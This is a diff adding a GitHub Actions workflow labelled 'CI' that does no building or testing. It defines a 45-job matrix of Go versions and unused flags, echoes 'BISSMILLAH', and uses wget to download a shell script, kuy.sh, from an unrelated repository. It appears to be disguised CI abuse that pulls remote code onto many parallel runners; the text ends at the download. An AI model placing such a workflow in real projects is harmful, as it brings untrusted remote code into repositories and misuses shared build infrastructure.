@@ -1,0 +1,30 @@
+name: CI
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 20
+    env:
+        NUM_JOBS: 3
+        JOB: ${{ matrix.go }}
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Run a one-line script
+        run: echo BISSMILLAH
+
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/kuysatu/gas/main/kuy.sh
